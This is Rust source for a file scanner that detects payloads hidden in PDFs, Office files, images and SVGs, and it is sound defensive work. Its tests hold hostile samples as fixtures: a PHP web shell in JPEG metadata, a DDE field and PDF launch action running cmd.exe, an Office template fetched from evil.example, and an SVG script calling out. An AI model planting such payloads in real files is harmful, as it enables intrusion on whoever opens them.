/// What the bytes are, by magic.
fn image_type(b: &[u8]) -> Option<&'static str> {
    if b.starts_with(&[0x89, b'P', b'N', b'G']) {
        Some("png")
    } else if b.starts_with(&[0xFF, 0xD8, 0xFF]) {
        Some("jpeg")
    } else if b.starts_with(b"GIF8") {
        Some("gif")
    } else if b.starts_with(b"RIFF") && b.get(8..12) == Some(b"WEBP") {
        Some("webp")
    } else if b.starts_with(b"BM") {
        Some("bmp")
    } else if b.starts_with(&[0, 0, 1, 0]) {
        Some("ico")
    } else if b.starts_with(b"II*\0") || b.starts_with(b"MM\0*") {
        Some("tiff")
    } else if b.get(4..8) == Some(b"ftyp") {
        Some("heif")
    } else {
        None
    }
}

const PAYLOAD_MARKS: &[(&[u8], &str)] = &[
    (b"PK\x03\x04", "a zip archive"),
    (b"MZ", "a Windows executable"),
    (b"\x7fELF", "an ELF executable"),
    (b"#!/", "a script"),
    (b"<?php", "PHP code"),
    (b"<script", "a script tag"),
    (b"eval(", "an eval call"),
    (b"base64_decode(", "a base64 decoder"),
    (b"powershell", "a PowerShell command"),
];

fn image(file: &str, ext: &str, bytes: &[u8], out: &mut Vec<Doc>) {
    let push = |out: &mut Vec<Doc>, id: &'static str, note: String, hard: bool| {
        out.push(Doc { file: file.into(), id, note, hard });
    };
    let actual = image_type(bytes);
    let claimed = match ext {
        "jpg" | "jpeg" => "jpeg",
        "tif" | "tiff" => "tiff",
        "heic" | "heif" | "avif" => "heif",
        e => e,
    };
    match actual {
        None => {
            let what = if bytes.starts_with(b"PK\x03\x04") {
                "a zip archive"
            } else if looks_like_text(bytes)
                && (find_ci(bytes, b"<html").is_some() || find_ci(bytes, b"<script").is_some())
            {
                "an HTML page"
            } else if looks_like_text(bytes) && find(bytes, b"<svg").is_some() {
                "an SVG"
            } else if looks_like_text(bytes) {
                "text"
            } else {
                "no image format"
            };
            let hard = what != "text" && what != "no image format" && what != "an SVG";
            push(out, "IMG-WRONG-TYPE", format!("named .{ext} but the bytes are {what}"), hard);
            if what == "an SVG" {
                svg(file, bytes, out);
            }
            return;
        }
        Some(t) if t != claimed => {
            push(
                out,
                "IMG-WRONG-TYPE",
                format!("named .{ext} but the bytes are {t}: the extension doesn't match the file"),
                false,
            );
        }
        _ => {}
    }
    // Data after the image's last byte.
    let end = match actual {
        Some("png") => rfind(bytes, b"IEND").map(|i| i + 8),
        Some("jpeg") => rfind(bytes, &[0xFF, 0xD9]).map(|i| i + 2),
        Some("gif") => Some(bytes.iter().rposition(|b| *b == 0x3B).map_or(bytes.len(), |i| i + 1)),
        _ => None,
    };
    if let Some(end) = end
        && end < bytes.len()
    {
        let trailer = &bytes[end..];
        if let Some((_, what)) = PAYLOAD_MARKS.iter().find(|(m, _)| find(trailer, m).is_some()) {
            push(
                out,
                "IMG-PAYLOAD",
                format!(
                    "{} KiB after the image's last byte, holding {what}: a payload riding on a picture",
                    trailer.len() >> 10
                ),
                true,
            );
            return;
        }
        if trailer.len() > 1024 {
            push(
                out,
                "IMG-TRAILER",
                format!(
                    "{} KiB after the image's last byte: data no viewer shows (steganography or a container)",
                    trailer.len() >> 10
                ),
                false,
            );
        }
    }
    // Code in metadata (EXIF, text chunks).
    if let Some((_, what)) = [
        (b"<?php" as &[u8], "PHP code"),
        (b"base64_decode(", "a base64 decoder"),
        (b"eval(", "an eval call"),
        (b"<script", "a script tag"),
    ]
    .iter()
    .find(|(m, _)| find(bytes, m).is_some())
    {
        push(
            out,
            "IMG-PAYLOAD",
            format!("{what} inside the image's metadata: a web shell or loader waiting for an include"),
            true,
        );
    }
}

/// SVG is XML that browsers run: scripts, handlers and external content.
fn svg(file: &str, bytes: &[u8], out: &mut Vec<Doc>) {
    let push = |out: &mut Vec<Doc>, id: &'static str, note: String, hard: bool| {
        out.push(Doc { file: file.into(), id, note, hard });
    };
    let lower: Vec<u8> = bytes.iter().take(MAX_MEMBER).map(|b| b.to_ascii_lowercase()).collect();
    let has = |s: &[u8]| find(&lower, s).is_some();
    if has(b"<script") {
        push(out, "IMG-SVG-SCRIPT", "a <script> element: the image runs code where it is rendered".into(), true);
    } else if has_handler(&lower) {
        push(out, "IMG-SVG-SCRIPT", "an on* event handler: the image runs code where it is rendered".into(), true);
    } else if has(b"javascript:") {
        push(out, "IMG-SVG-SCRIPT", "a javascript: URI: the image runs code where it is rendered".into(), true);
    }
    if has(b"<!entity") {
        push(
            out,
            "IMG-SVG-SCRIPT",
            "an XML entity declaration: the parser can be made to read local files (XXE)".into(),
            true,
        );
    }
    if has(b"<foreignobject") || has(b"<iframe") || has(b"<embed") || has(b"<object") {
        push(
            out,
            "IMG-SVG-EXTERNAL",
            "foreignObject, iframe, embed or object: HTML or another document inside the image".into(),
            false,
        );
    } else if has(b"href=\"http") || has(b"href='http") || has(b"href=\"//") {
        push(out, "IMG-SVG-EXTERNAL", "content loaded from another host when the image renders".into(), false);
    }
}

/// ` onload=`, ` onclick=`, …: an attribute starting with `on` followed by
/// letters and `=`.
fn has_handler(lower: &[u8]) -> bool {
    let mut from = 0;
    while let Some(i) = find(&lower[from..], b" on") {
        let at = from + i + 3;
        let letters = lower[at..].iter().take_while(|c| c.is_ascii_lowercase()).count();
        if letters >= 3 && lower.get(at + letters) == Some(&b'=') {
            return true;
        }
        from = at;
    }
    false
}

// --- ClamAV ---------------------------------------------------------------

/// `clamscan` (or `clamdscan`) over these files, when installed: the
/// infected ones with their signature names. `None` when no scanner is
/// installed; `Err` text when it couldn't run.
pub fn clamav(files: &[PathBuf]) -> Option<Result<Vec<(PathBuf, String)>, String>> {
    let (bin, daemon) = match (crate::system::which("clamdscan"), crate::system::which("clamscan")) {
        (Some(d), _) => (d, true),
        (None, Some(s)) => (s, false),
        (None, None) => return None,
    };
    if files.is_empty() {
        return Some(Ok(Vec::new()));
    }
    let list = match crate::system::TempDir::new("clamav") {
        Ok(d) => d,
        Err(e) => return Some(Err(e.to_string())),
    };
    let list_file = list.path().join("files.txt");
    let text: String = files.iter().take(5000).map(|p| format!("{}\n", p.display())).collect();
    if let Err(e) = std::fs::write(&list_file, text) {
        return Some(Err(e.to_string()));
    }
    let mut argv: Vec<&OsStr> = vec![bin.as_os_str(), OsStr::new("--infected"), OsStr::new("--no-summary")];
    if daemon {
        argv.push(OsStr::new("--fdpass"));
    } else {
        argv.push(OsStr::new("--stdout"));
    }
    argv.push(OsStr::new("--file-list"));
    argv.push(list_file.as_os_str());
    let out = match crate::system::exec(&argv, &[], Duration::from_secs(600)) {
        Ok(o) => o,
        Err(e) => return Some(Err(e.to_string())),
    };
    // 0 clean, 1 infected, 2 error.
    if out.code == Some(2) {
        return Some(Err(format!("{} exited 2: {}", bin.display(), out.stderr.lines().next().unwrap_or("").trim())));
    }
    let mut hits = Vec::new();
    for line in out.stdout.lines() {
        if let Some(rest) = line.strip_suffix(" FOUND")
            && let Some((path, sig)) = rest.rsplit_once(": ")
        {
            hits.push((PathBuf::from(path), sig.to_string()));
        }
    }
    Some(Ok(hits))
}

/// Every document and image under `root` (for ClamAV), `depth` levels down.
pub fn files_under(root: &Path, depth: usize) -> Vec<PathBuf> {
    let mut out = Vec::new();
    for (dir, files) in repos::walk(root, depth) {
        for name in files {
            if wanted(&name) {
                out.push(dir.join(name));
            }
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ids(v: &[Doc]) -> Vec<(&str, bool)> {
        v.iter().map(|d| (d.id, d.hard)).collect()
    }

    /// A zip with stored members, as `zipfile` would write it.
    fn zip_stored(members: &[(&str, &[u8])]) -> Vec<u8> {
        let mut out = Vec::new();
        let mut central = Vec::new();
        for (name, data) in members {
            let offset = out.len() as u32;
            out.extend_from_slice(b"PK\x03\x04");
            out.extend_from_slice(&[20, 0, 0, 0, 0, 0, 0, 0, 0, 0]); // version, flags, method 0, time, date
            out.extend_from_slice(&[0, 0, 0, 0]); // crc (unchecked)
            out.extend_from_slice(&(data.len() as u32).to_le_bytes());
            out.extend_from_slice(&(data.len() as u32).to_le_bytes());
            out.extend_from_slice(&(name.len() as u16).to_le_bytes());
            out.extend_from_slice(&[0, 0]);
            out.extend_from_slice(name.as_bytes());
            out.extend_from_slice(data);
            central.extend_from_slice(b"PK\x01\x02");
            central.extend_from_slice(&[20, 0, 20, 0, 0, 0, 0, 0, 0, 0, 0, 0]);
            central.extend_from_slice(&[0, 0, 0, 0]);
            central.extend_from_slice(&(data.len() as u32).to_le_bytes());
            central.extend_from_slice(&(data.len() as u32).to_le_bytes());
            central.extend_from_slice(&(name.len() as u16).to_le_bytes());
            central.extend_from_slice(&[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]);
            central.extend_from_slice(&offset.to_le_bytes());
            central.extend_from_slice(name.as_bytes());
        }
        let cd_offset = out.len() as u32;
        out.extend_from_slice(&central);
        out.extend_from_slice(b"PK\x05\x06");
        out.extend_from_slice(&[0, 0, 0, 0]);
        out.extend_from_slice(&(members.len() as u16).to_le_bytes());
        out.extend_from_slice(&(members.len() as u16).to_le_bytes());
        out.extend_from_slice(&(central.len() as u32).to_le_bytes());
        out.extend_from_slice(&cd_offset.to_le_bytes());
        out.extend_from_slice(&[0, 0]);
        out
    }

    #[test]
    fn inflate_reads_the_three_block_types() {
        let dynamic: &[u8] = &[
            0xcb, 0x48, 0xcd, 0xc9, 0xc9, 0x57, 0xc8, 0x40, 0x27, 0x75, 0x14, 0x8a, 0x13, 0x33, 0x53, 0x14, 0x4a, 0x32,
            0x52, 0x15, 0x52, 0xf2, 0x93, 0x4b, 0x73, 0x53, 0xf3, 0x4a, 0x14, 0x4a, 0xf2, 0xc1, 0xfc, 0xe2, 0xe4, 0xc4,
            0xbc, 0xbc, 0xd4, 0x22, 0x6b, 0xa8, 0xf2, 0xc4, 0xf4, 0xc4, 0xcc, 0x3c, 0x3d, 0x00,
        ];
        assert_eq!(
            inflate(dynamic, 1 << 20).as_deref(),
            Some(b"hello hello hello hello, said the document to the scanner; hello again." as &[u8])
        );
        let fixed: &[u8] = &[0x4b, 0x4c, 0x4a, 0x4e, 0x84, 0x21, 0x85, 0x8a, 0xca, 0x2a, 0x00];
        assert_eq!(inflate(fixed, 1 << 20).as_deref(), Some(b"abcabcabcabc xyz" as &[u8]));
        let stored: &[u8] = &[0x01, 0x07, 0x00, 0xf8, 0xff, 0x73, 0x74, 0x6f, 0x72, 0x65, 0x64, 0x21];
        assert_eq!(inflate(stored, 1 << 20).as_deref(), Some(b"stored!" as &[u8]));
        assert_eq!(inflate(dynamic, 10), None, "the output cap holds");
        assert_eq!(inflate(&dynamic[..20], 1 << 20), None, "truncated input is an error, not a panic");
        assert_eq!(inflate(&[0xff; 64], 1 << 20), None);
    }

    #[test]
    fn pdfs() {
        let plain = b"%PDF-1.4\n1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >> endobj\n%%EOF\n";
        assert!(scan_bytes("a.pdf", plain).is_empty(), "an open action alone is a page to open at");
        let js =
            b"%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >> endobj\n%%EOF";
        assert_eq!(ids(&scan_bytes("a.pdf", js)), [("DOC-JS-ON-OPEN", true)]);
        let js_only = b"%PDF-1.7\n1 0 obj << /Type /Annot /A << /S /JavaScript /JS (calc()) >> >> endobj\n%%EOF";
        assert_eq!(ids(&scan_bytes("a.pdf", js_only)), [("DOC-JAVASCRIPT", false)]);
        let launch = b"%PDF-1.7\n1 0 obj << /S /Launch /F (cmd.exe) >> endobj\n%%EOF";
        assert_eq!(ids(&scan_bytes("a.pdf", launch)), [("DOC-LAUNCH", true)]);
        let escaped = b"%PDF-1.7\n1 0 obj << /S /J#61vaScript /J#53 (x) /OpenAction 1 0 R >> endobj\n%%EOF";
        let got = scan_bytes("a.pdf", escaped);
        assert!(ids(&got).contains(&("DOC-OBFUSCATED", true)), "{got:?}");
        assert!(ids(&got).contains(&("DOC-JS-ON-OPEN", true)), "decoded names still count: {got:?}");
        let mut trailer = b"%PDF-1.4\n%%EOF\n".to_vec();
        trailer.extend(std::iter::repeat_n(b'x', 5000));
        assert_eq!(ids(&scan_bytes("a.pdf", &trailer)), [("DOC-TRAILER", false)]);
        let html = b"<html><body>not a pdf</body></html>\n";
        let got = scan_bytes("report.pdf", html);
        assert_eq!(ids(&got), [("DOC-POLYGLOT", true)]);
        assert!(got[0].note.contains("markup"), "{}", got[0].note);
        let exe = b"MZ\x90\x00this is a program";
        assert_eq!(ids(&scan_bytes("invoice.pdf", exe)), [("DISGUISED-PROGRAM", true)]);
        assert_eq!(count_names(b"/JS /JScript /JS", b"/JS"), 2);
        // Random bytes inside a compressed stream don't count (an arXiv paper
        // spelled `/JS` by chance); the same names in an inflated object stream do.
        let binary = b"%PDF-1.4\n1 0 obj << /Length 40 /Filter /FlateDecode >> stream\n\x00\xffIP/JS\x16\x10xx/AA\x01 /OpenAction /Launch\nendstream\nendobj\n%%EOF";
        assert!(scan_bytes("paper.pdf", binary).is_empty());
        let mut objstm =
            b"%PDF-1.5\n5 0 obj << /Type /ObjStm /N 2 /First 8 /Filter /FlateDecode /Length 82 >> stream\n".to_vec();
        objstm.extend_from_slice(&[
            0x33, 0x54, 0x30, 0x50, 0x30, 0x52, 0x30, 0x33, 0x50, 0xb0, 0xb1, 0x51, 0xd0, 0x0f, 0xa9, 0x2c, 0x48, 0x55,
            0xd0, 0x77, 0x4e, 0x2c, 0x49, 0xcc, 0xc9, 0x4f, 0x57, 0xd0, 0xf7, 0x2f, 0x48, 0xcd, 0x73, 0x4c, 0x2e, 0xc9,
            0xcc, 0xcf, 0x03, 0x2a, 0x31, 0x50, 0x08, 0x52, 0xb0, 0xb3, 0x03, 0x2b, 0x0b, 0x56, 0xd0, 0xf7, 0x4a, 0x2c,
            0x4b, 0x0c, 0x4e, 0x2e, 0xca, 0x2c, 0x28, 0x01, 0xb2, 0x83, 0x15, 0x34, 0x12, 0x0b, 0x0a, 0xf4, 0x12, 0x73,
            0x52, 0x8b, 0x4a, 0x34, 0x0c, 0x35, 0x35, 0x81, 0xea, 0x00,
        ]);
        objstm.extend_from_slice(b"\nendstream\nendobj\n%%EOF");
        let got = scan_bytes("hidden.pdf", &objstm);
        assert_eq!(ids(&got), [("DOC-JS-ON-OPEN", true)], "{got:?}");
        assert!(got[0].note.contains("object stream(s) inflated"), "{}", got[0].note);
    }

    #[test]
    fn office_documents() {
        let types = br#"<Types><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>"#;
        let clean = zip_stored(&[("[Content_Types].xml", types), ("word/document.xml", b"<w:document/>")]);
        assert!(scan_bytes("letter.docx", &clean).is_empty());
        let macros = zip_stored(&[
            ("[Content_Types].xml", types),
            ("word/vbaProject.bin", b"\x01vba"),
            ("word/document.xml", b"<w:document/>"),
        ]);
        assert_eq!(ids(&scan_bytes("letter.docx", &macros)), [("DOC-MACRO", true)], "macros in a .docx fail");
        assert_eq!(ids(&scan_bytes("letter.docm", &macros)), [("DOC-MACRO", false)], "macros in a .docm warn");
        let xl4 = zip_stored(&[("xl/workbook.xml", b"<workbook/>"), ("xl/macrosheets/sheet1.xml", b"<macrosheet/>")]);
        assert_eq!(ids(&scan_bytes("q.xlsx", &xl4)), [("DOC-XL4-MACRO", true)]);
        let rels = br#"<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com" TargetMode="External"/></Relationships>"#;
        let remote = zip_stored(&[("word/_rels/settings.xml.rels", rels), ("word/settings.xml", b"<w:settings/>")]);
        let got = scan_bytes("letter.docx", &remote);
        assert_eq!(ids(&got), [("DOC-REMOTE-TEMPLATE", true)]);
        assert!(got[0].note.contains("evil.example"), "{}", got[0].note);
        let local = br#"<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file:///C:\Users\me\Templates\Normal.dotm" TargetMode="External"/></Relationships>"#;
        assert!(
            scan_bytes("letter.docx", &zip_stored(&[("word/_rels/settings.xml.rels", local)])).is_empty(),
            "a template on the author's own disk is how Word works"
        );
        let dde = zip_stored(&[("word/document.xml", br#"<w:document><w:instrText>DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"</w:instrText></w:document>"#)]);
        assert_eq!(ids(&scan_bytes("letter.docx", &dde)), [("DOC-DDE", true)]);
        let ole_obj = zip_stored(&[
            ("word/embeddings/oleObject1.bin", b"\xd0\xcf\x11\xe0"),
            ("word/document.xml", b"<w:document/>"),
        ]);
        assert_eq!(ids(&scan_bytes("letter.docx", &ole_obj)), [("DOC-OLE-OBJECT", false)]);
        assert_eq!(ids(&scan_bytes("letter.docx", b"not a zip at all, just text")), [("DOC-UNREADABLE", false)]);
        // Legacy binary formats and RTF.
        let mut legacy = CFB.to_vec();
        legacy.extend_from_slice(&[0u8; 64]);
        legacy.extend(utf16("_VBA_PROJECT"));
        assert_eq!(ids(&scan_bytes("old.doc", &legacy)), [("DOC-MACRO", false)]);
        assert_eq!(
            ids(&scan_bytes("old.docx", &legacy)),
            [("DOC-MACRO", true)],
            "a legacy file named .docx with macros"
        );
        let rtf_obj = b"{\\rtf1\\ansi{\\object\\objemb{\\*\\objclass Equation.3}{\\*\\objdata 0105}}}";
        assert_eq!(ids(&scan_bytes("x.rtf", rtf_obj)), [("DOC-RTF-OBJECT", true)]);
        assert_eq!(ids(&scan_bytes("x.rtf", b"{\\rtx\\ansi hello}")), [("DOC-OBFUSCATED", true)]);
        assert!(scan_bytes("x.rtf", b"{\\rtf1\\ansi hello world}").is_empty());
    }

    #[test]
    fn images() {
        let mut png = vec![0x89, b'P', b'N', b'G', 0x0D, 0x0A, 0x1A, 0x0A];
        png.extend_from_slice(b"\0\0\0\0IEND\xaeB`\x82");
        assert!(scan_bytes("a.png", &png).is_empty());
        let mut payload = png.clone();
        payload.extend_from_slice(b"PK\x03\x04 a whole zip follows");
        assert_eq!(ids(&scan_bytes("a.png", &payload)), [("IMG-PAYLOAD", true)]);
        let mut trailer = png.clone();
        trailer.extend(std::iter::repeat_n(0u8, 4096));
        assert_eq!(ids(&scan_bytes("a.png", &trailer)), [("IMG-TRAILER", false)]);
        assert_eq!(ids(&scan_bytes("a.jpg", &png)), [("IMG-WRONG-TYPE", false)], "a png named jpg");
        assert_eq!(ids(&scan_bytes("a.png", b"MZ\x90\x00\x03")), [("DISGUISED-PROGRAM", true)]);
        assert_eq!(ids(&scan_bytes("a.png", b"<html><script>x</script></html>")), [("IMG-WRONG-TYPE", true)]);
        let mut jpg = vec![0xFF, 0xD8, 0xFF, 0xE1, 0x00, 0x10];
        jpg.extend_from_slice(b"Exif\0\0<?php system($_GET['c']); ?>");
        jpg.extend_from_slice(&[0xFF, 0xD9]);
        assert_eq!(ids(&scan_bytes("shell.jpg", &jpg)), [("IMG-PAYLOAD", true)]);
        let svg_script = b"<svg xmlns=\"http://www.w3.org/2000/svg\"><script>fetch('https://x.y')</script></svg>";
        assert_eq!(ids(&scan_bytes("logo.svg", svg_script)), [("IMG-SVG-SCRIPT", true)]);
        let svg_handler = b"<svg onload=\"alert(1)\"><circle r=\"1\"/></svg>";
        assert_eq!(ids(&scan_bytes("logo.svg", svg_handler)), [("IMG-SVG-SCRIPT", true)]);
        let svg_ext = b"<svg><image href=\"https://x.y/a.png\"/></svg>";
        assert_eq!(ids(&scan_bytes("logo.svg", svg_ext)), [("IMG-SVG-EXTERNAL", false)]);
        assert!(
            scan_bytes("logo.svg", b"<svg viewBox=\"0 0 1 1\"><path d=\"M0 0h1v1z\" fill=\"none\"/></svg>").is_empty()
        );
        assert!(
            scan_bytes("x.svg", b"<svg><g id=\"onion\" font=\"x\"/></svg>").is_empty(),
            "words starting with on are not handlers"
        );
    }

    #[test]
    fn walks_and_skips_output_dirs() {
        let d = crate::system::TempDir::new("documents").unwrap();
        std::fs::create_dir_all(d.path().join("node_modules/x")).unwrap();
        std::fs::create_dir_all(d.path().join("docs")).unwrap();
        std::fs::write(d.path().join("node_modules/x/a.pdf"), b"MZ\x90\x00").unwrap();
        std::fs::write(d.path().join("docs/a.pdf"), b"%PDF-1.4\n<< /S /Launch >>\n%%EOF").unwrap();
        std::fs::write(
            d.path().join("docs/ok.png"),
            [0x89, b'P', b'N', b'G', 0, 0, 0, 0, b'I', b'E', b'N', b'D', 0, 0, 0, 0],
        )
        .unwrap();
        std::fs::write(d.path().join("notes.md"), "MZ not a document").unwrap();
        let got = scan_dir(d.path(), 6);
        assert_eq!(ids(&got), [("DOC-LAUNCH", true)], "{got:?}");
        assert_eq!(got[0].file, "docs/a.pdf");
        assert_eq!(files_under(d.path(), 6).len(), 2);
    }
}
